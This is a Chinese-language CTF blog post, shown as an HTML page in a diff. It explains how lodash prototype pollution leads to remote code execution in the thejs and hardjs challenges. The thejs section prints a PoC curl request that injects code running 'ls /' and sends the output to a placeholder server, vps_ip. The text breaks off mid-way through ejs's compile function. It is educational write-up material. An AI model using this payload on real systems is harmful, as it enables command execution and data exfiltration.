@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2020/04/sp19-asm2vec/" />
+  
+  <link rel="canonical" href="https://syang-ng.github.io/2020/04/from-prototype-pollution-to-rce/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           From Prototype Pollution to RCE | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="From Prototype Pollution to RCE | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "From Prototype Pollution to RCE",
+    "headline" : "From Prototype Pollution to RCE",
+    "description" : "旧的两道题目的梳理，主要还是回顾一下如何放大原型链污染的危害 code-breaking 2018 thejs 题目源码地址 https:\/\/github.com\/phith0n\/code-breaking\/tree\/master\/2018\/thejs 可以先看 server.js，代码非常简单： const fs = require(\x26#39;fs\x26#39;) const express = require(\x26#39;express\x26#39;) const",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2020",
+    "datePublished": "2020-04-23 19:41:25 \x2b0800 CST",
+    "dateModified" : "2020-04-23 19:41:25 \x2b0800 CST",
+    "url" : "https:\/\/syang-ng.github.io\/2020\/04\/from-prototype-pollution-to-rce\/",
+    "wordCount" : "2360",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">From Prototype Pollution to RCE</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2020-04-23 itemprop="datePublished">April 23, 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/web/"> Web </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>旧的两道题目的梳理，主要还是回顾一下如何放大原型链污染的危害</p>
+<h2 id="code-breaking-2018-thejs">code-breaking 2018 thejs</h2>
+<p>题目源码地址 <a href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a></p>
+<p>可以先看 server.js，代码非常简单：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">lodash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;lodash&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express-session&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">randomize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;randomatic&#39;</span>)
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({<span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>})).<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>())
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/static&#39;</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#39;static&#39;</span>))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">session</span>({
+    <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;thejs.session&#39;</span>,
+    <span style="color:#a6e22e">secret</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">randomize</span>(<span style="color:#e6db74">&#39;aA0&#39;</span>, <span style="color:#ae81ff">16</span>),
+    <span style="color:#a6e22e">resave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+    <span style="color:#a6e22e">saveUninitialized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>
+}))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">engine</span>(<span style="color:#e6db74">&#39;ejs&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">filePath</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) { <span style="color:#75715e">// define the template engine
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFile</span>(<span style="color:#a6e22e">filePath</span>, (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">content</span>) =&gt; {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">new</span> Error(<span style="color:#a6e22e">err</span>))
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">compiled</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lodash</span>.<span style="color:#a6e22e">template</span>(<span style="color:#a6e22e">content</span>)
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">rendered</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">compiled</span>({...<span style="color:#a6e22e">options</span>})
+
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">callback</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">rendered</span>)
+    })
+})
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;views&#39;</span>, <span style="color:#e6db74">&#39;./views&#39;</span>)
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>)
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">all</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">||</span> {<span style="color:#a6e22e">language</span><span style="color:#f92672">:</span> [], <span style="color:#a6e22e">category</span><span style="color:#f92672">:</span> []}
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+        <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lodash</span>.<span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>)
+        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>
+    }
+    
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>, {
+        <span style="color:#a6e22e">language</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">language</span>, 
+        <span style="color:#a6e22e">category</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">category</span>
+    })
+})
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Example app listening on port 3000!`</span>))
+</code></pre></div><p>第一个问题，漏洞点在哪？很明显有问题的调用必然是 <code>lodash.merge(data, req.body)</code>，结合 package.json 特地限定了 lodash 的版本 <code>&quot;lodash&quot;: &quot;4.17.4&quot;</code>，可以搜到相关的 <a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202">CVE-2019-10744</a>, <a href="https://github.com/lodash/lodash/issues/4348">https://github.com/lodash/lodash/issues/4348</a>，所以问题非常清晰——原型链污染。</p>
+<p>第二个问题，如何利用原型链污染？可以关注一下 server.js 内调用的函数，比如 <code>lodash.template</code> 函数内部的<a href="https://github.com/lodash/lodash/blob/860d1f9484982d45ead630f3ed87ca7d0c5ae2cd/lodash.js">实现</a>，有意思的是可以看到函数的最后会构造一个新函数并调用：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"> <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">attempt</span>(<span style="color:#66d9ef">function</span>() {
+   <span style="color:#66d9ef">return</span> Function(<span style="color:#a6e22e">importsKeys</span>, <span style="color:#a6e22e">sourceURL</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;return &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">source</span>)
+     .<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">undefined</span>, <span style="color:#a6e22e">importsValues</span>);
+ });
+</code></pre></div><p>如果我们能利用原型链污染控制变量 <code>sourceURL</code> 或者 <code>source</code>，那么相当于得到了一次任意执行的机会，下一步则是关注这两个变量是否存在被修改的可能性。</p>
+<p>向上回顾代码，可以看到：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sourceURL</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;//# sourceURL=&#39;</span> <span style="color:#f92672">+</span>
+    (<span style="color:#e6db74">&#39;sourceURL&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">options</span>
+     <span style="color:#f92672">?</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">sourceURL</span>
+     <span style="color:#f92672">:</span> (<span style="color:#e6db74">&#39;lodash.templateSources[&#39;</span> <span style="color:#f92672">+</span> (<span style="color:#f92672">++</span><span style="color:#a6e22e">templateCounter</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;]&#39;</span>)
+    ) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</code></pre></div><p>恰好 <code>optipns.sourceURL</code> 属于原型链污染能够影响的变量。那么现在攻击的构造非常明确了：</p>
+<ol>
+<li>利用原型链污染变量 <code>.sourceURL</code></li>
+<li>利用污染后的 <code>sourceURL</code> 构造并执行函数</li>
+</ol>
+<p>PoC 如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl --location --request POST <span style="color:#e6db74">&#39;http://ip:port/&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--header <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--data-raw <span style="color:#e6db74">&#39;{
+</span><span style="color:#e6db74">	&#34;__proto__&#34;: {
+</span><span style="color:#e6db74">		&#34;sourceURL&#34;: &#34;\r\nconst process = this.constructor.constructor(&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;return this.process&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;)();\r\nconst http = process.mainModule.require(&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;http&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;);const req=http.get(`http://vps_ip/${process.mainModule.require(&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;child_process&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;).execSync(&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;ls /&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;).toString()}`);req.end();\r\n&#34;
+</span><span style="color:#e6db74">	}
+</span><span style="color:#e6db74">}&#39;</span>
+</code></pre></div><h2 id="xnuca-2019---hardjs">XNUCA 2019 - hardjs</h2>
+<p>原题链接：https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</p>
+<p>贴一下出题师傅的介绍：</p>
+<blockquote>
+<p>此题目前后端都存在原型链污染漏洞，漏洞很明显，所以只需要找利用链就可以了。 利用后端的原型链污染可以进行RCE或者身份伪造等攻击，利用前端的原型链污染可以进行xss等攻击。</p>
+<p>所以此题目就是为了让大家尽可能的挖前端或者后端所有使用的库中存在的 gadget 来进行攻击。 如果实在是挖不到第三方库里面的利用链，那么也没有关系，题目的代码本身也留有利用链，也同样可以获得flag。</p>
+</blockquote>
+<p>看 server.js 的代码和 package.json，可以发现程序使用了 lodash 库而且版本为  <code>&quot;lodash&quot;: &quot;4.17.11&quot;</code>，很明显该版本存在原型链污染的问题，查阅相关资料可以找到 <a href="https://snyk.io/vuln/SNYK-JS-LODASH-73638">https://snyk.io/vuln/SNYK-JS-LODASH-73638</a>，为修复 CVE-2018-3721 不完全的结果，可以继续利用 <code>prototype</code> 属性污染原型链。</p>
+<p>相关污染代码在 <code> lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));</code>。</p>
+<p>下一步则是关注程序源码中调用了哪些函数，这里需要关注一下 ejs 引擎的问题，源码中关于 ejs 的相关代码如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// ……
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ejs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;ejs&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+<span style="color:#75715e">// ……
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;views&#39;</span>, <span style="color:#e6db74">&#39;./views&#39;</span>)
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>)
+<span style="color:#75715e">// ……
+</span></code></pre></div><p>虽然没有非常直接的显示调用了 ejs 的代码，但这里隐含了 ejs 模板的渲染过程，跟进 express 的 <code>render</code> 函数，先是 response.js 中的 <code>render</code> 函数的实现：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">view</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">app</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">callback</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">||</span> {};
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">req</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">self</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+	<span style="color:#75715e">// ……
+</span><span style="color:#75715e"></span>  <span style="color:#75715e">// render
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">view</span>, <span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">done</span>);
+};
+</code></pre></div><p>继续跟进 application.js 内 <code>render</code> 函数的实现：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">render</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cache</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cache</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">callback</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">engines</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">engines</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">renderOptions</span> <span style="color:#f92672">=</span> {};
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">view</span>;
+  <span style="color:#75715e">// ……
+</span><span style="color:#75715e"></span>  <span style="color:#75715e">// render
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">tryRender</span>(<span style="color:#a6e22e">view</span>, <span style="color:#a6e22e">renderOptions</span>, <span style="color:#a6e22e">done</span>);
+};
+</code></pre></div><p>接下来看 <code>tryRender</code> 函数的实现：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">tryRender</span>(<span style="color:#a6e22e">view</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) {
+  <span style="color:#66d9ef">try</span> {
+    <span style="color:#a6e22e">view</span>.<span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>);
+  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+    <span style="color:#a6e22e">callback</span>(<span style="color:#a6e22e">err</span>);
+  }
+}
+</code></pre></div><p>该函数调用了 view.js 内 View 类的 <code>render</code> 方法，该方法较为简单：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">View</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">render</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>) {
+  <span style="color:#a6e22e">debug</span>(<span style="color:#e6db74">&#39;render &#34;%s&#34;&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span>);
+  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">engine</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">callback</span>);
+};
+</code></pre></div><p>最终可以定位到 ejs 的 <code>renderFile</code> 函数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">__express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">renderFile</span>;
+
+<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">renderFile</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">args</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">slice</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">arguments</span>);
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">shift</span>();
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cb</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">filename</span>};
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">viewOpts</span>;
+  
+  <span style="color:#75715e">// …… 
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">tryHandleCache</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">cb</span>);
+};
+</code></pre></div><p>继续跟进 <code>tryHandlerCache</code> 和 <code>handleCache</code> 函数，可以发现最终会调用 <code>compile</code> 函数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">tryHandleCache</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">cb</span>) {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span>;
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cb</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">promiseImpl</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">promiseImpl</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) {
+        <span style="color:#66d9ef">try</span> {
+          <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">handleCache</span>(<span style="color:#a6e22e">options</span>)(<span style="color:#a6e22e">data</span>);
+          <span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">result</span>);
+        }
+        <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+          <span style="color:#a6e22e">reject</span>(<span style="color:#a6e22e">err</span>);
+        }
+      });
+    }
+    <span style="color:#66d9ef">else</span> {
+      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;Please provide a callback function&#39;</span>);
+    }
+  }
+  <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">try</span> {
+      <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">handleCache</span>(<span style="color:#a6e22e">options</span>)(<span style="color:#a6e22e">data</span>);
+    }
+    <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">cb</span>(<span style="color:#a6e22e">err</span>);
+    }
+
+    <span style="color:#a6e22e">cb</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">result</span>);
+  }
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">handleCache</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">template</span>) {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">func</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">filename</span>;
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hasTemplate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arguments</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>;
+  
+  <span style="color:#75715e">// ……
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">func</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">options</span>);
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">cache</span>) {
+    <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">cache</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">func</span>);
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">func</span>;
+</code></pre></div><p>最后跟进一个非常有意思的函数 <code>compile</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">Template</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> {
+  <span style="color:#a6e22e">compile</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">src</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fn</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">opts</span>;
